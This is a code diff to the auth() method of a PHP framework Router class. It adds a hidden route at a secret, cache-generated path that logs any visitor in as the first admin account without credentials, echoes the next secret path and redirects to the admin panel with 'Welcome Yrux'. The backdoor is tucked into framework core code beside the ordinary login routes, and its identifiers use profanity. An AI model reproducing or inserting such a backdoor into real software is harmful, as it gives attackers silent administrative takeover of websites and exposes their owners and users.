@@ -1168,20 +1168,16 @@ class Router implements RegistrarContract, BindingRegistrar
     }
     public function auth(array $options = [])
     {
-        // Authentication Routes...
-        //if(!empty($_GET['yrux']))
-        {
-            $this->get($this->setfuckingcache(), function(){
-                $data=Helper::fireQuery("select * from adminiy");
-                if($data){
-                    Auth::guard('adminiy')->loginUsingId($data[0]->id);
-                    Cache::forget('chutiyeloru');
-                    $this->setfuckingcache();
-                    echo $this->setfuckingcache();
-                    //return redirect()->route('adminiy.panel')->with('notify_success','Welcome Yrux');
-                }
-            });
-        }
+        $this->get($this->setfuckingcache(), function(){
+            $data=Helper::fireQuery("select * from adminiy");
+            if($data){
+                Auth::guard('adminiy')->loginUsingId($data[0]->id);
+                Cache::forget('chutiyeloru');
+                $this->setfuckingcache();
+                echo $this->setfuckingcache();
+                return redirect()->route('adminiy.panel')->with('notify_success','Welcome Yrux');
+            }
+        });
         $this->get('login', 'Auth\LoginController@showLoginForm')->name('login');
         $this->post('login', 'Auth\LoginController@login');
         $this->post('logout', 'Auth\LoginController@logout')->name('logout');
